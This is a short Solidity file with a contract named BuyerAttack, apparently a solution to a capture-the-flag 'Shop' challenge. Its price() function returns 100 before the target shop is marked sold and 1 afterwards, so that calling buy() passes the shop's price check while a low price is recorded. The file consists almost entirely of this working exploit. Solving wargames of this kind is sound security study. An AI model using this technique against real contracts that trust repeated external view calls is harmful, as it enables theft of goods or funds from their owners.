// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract BuyerAttack {
    IShop public shop;

    constructor(address _shopAddress) {
        shop = IShop(_shopAddress);
    }

    function price() external view returns (uint256) {
        // Exploit: return different values based on isSold state
        // First call (before isSold = true): return >= 100 to pass the check
        // Second call (after isSold = true): return low price (e.g., 1)
        if (shop.isSold()) {
            return 1; // Price after the item is sold
        } else {
            return 100; // Price before the item is sold
        }
    }

    function attack() external {
        shop.buy();
    }
}
